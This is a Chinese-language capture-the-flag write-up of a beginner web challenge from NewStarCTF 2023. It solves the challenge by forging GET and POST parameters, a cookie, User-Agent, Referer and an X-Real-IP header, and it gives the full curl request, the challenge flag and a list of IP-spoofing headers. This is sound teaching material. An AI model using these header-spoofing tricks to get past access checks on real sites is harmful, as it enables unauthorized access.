---
title: "[NewStarCTF 2023 公开赛道]Begin of HTTP"
platform: BUUCTF
category: Web
difficulty: 入门
tags: [http-request, cookie, user-agent, referer, x-real-ip, source-code-audit]
vulnerability: HTTP 请求头伪造绕过多重验证
solved: true
flag: "flag{dd7b9139-7afc-4254-8484-b9c96dd25f80}"
---

# [NewStarCTF 2023 公开赛道]Begin of HTTP

## 题目概述
一道 HTTP 请求构造入门题，需要依次通过 5 关验证，每关检查不同的 HTTP 请求要素：GET 参数、POST 参数、Cookie、User-Agent、Referer、客户端 IP。

## 信息收集
访问页面得到第一关提示：
```
请使用 GET方式 来给 ctf 参数传入任意值来通过这关
```

依次通过关卡后，在第二关页面源码中发现 HTML 注释：
```html
<!-- Secret: base64_decode(bjN3c3Q0ckNURjIwMjNnMDAwMDBk) -->
```

## 漏洞分析（漏洞类型、原理、判断过程）
- **漏洞类型**：HTTP 请求头伪造
- **原理**：服务器通过检查 HTTP 请求的各个要素（参数、Cookie、请求头）来验证用户身份，但这些都可以被客户端伪造
- **判断过程**：根据页面提示逐步构造请求，发现需要伪造本地 IP 时使用 `X-Real-IP` 头绕过

## 利用过程（Payload + Flag）

**Step 1**: GET 参数 `ctf`
```
?ctf=1
```

**Step 2**: POST 参数 `secret`，值从源码注释解码
```bash
echo "bjN3c3Q0ckNURjIwMjNnMDAwMDBk" | base64 -d
# 结果: n3wst4rCTF2023g00000d
```

**Step 3**: Cookie `power=ctfer`

**Step 4**: User-Agent: `NewStarCTF2023`

**Step 5**: Referer: `newstarctf.com`

**Step 6**: X-Real-IP: `127.0.0.1`（伪造本地用户）

**完整 Payload**：
```bash
curl -X POST "http://target?ctf=1" \
  -d "secret=n3wst4rCTF2023g00000d" \
  -b "power=ctfer" \
  -H "User-Agent: NewStarCTF2023" \
  -H "Referer: newstarctf.com" \
  -H "X-Real-IP: 127.0.0.1"
```

**Flag**: `flag{dd7b9139-7afc-4254-8484-b9c96dd25f80}`

## 复现步骤
1. 访问题目页面，按提示添加 GET 参数 `ctf=1`
2. 查看源码，解码 base64 得到 secret 值
3. 构造完整请求，依次添加所有必需的参数和请求头
4. 获取 flag

## 技术总结（表格：漏洞类型/攻击入口/核心Payload/知识点）

| 漏洞类型 | 攻击入口 | 核心 Payload | 知识点 |
|---------|---------|-------------|--------|
| 信息泄露 | HTML 注释 | base64 解码 | 源码审计 |
| 请求伪造 | GET/POST 参数 | `?ctf=1`, `secret=xxx` | HTTP 方法 |
| Cookie 伪造 | Cookie 头 | `power=ctfer` | Cookie 机制 |
| UA 伪造 | User-Agent 头 | `NewStarCTF2023` | UA 验证绕过 |
| Referer 伪造 | Referer 头 | `newstarctf.com` | 来源验证绕过 |
| IP 伪造 | X-Real-IP 头 | `127.0.0.1` | 客户端 IP 伪造 |

## 知识总结（解题技巧、同类题型套路）
- **源码审计**：养成查看页面源码的习惯，敏感信息常藏在 HTML 注释中
- **HTTP 头伪造**：常见伪造本地 IP 的请求头有 `X-Forwarded-For`、`X-Real-IP`、`Client-IP` 等，需逐一尝试
- **逐关突破**：按提示逐步构造请求，注意保留前面所有关卡的参数
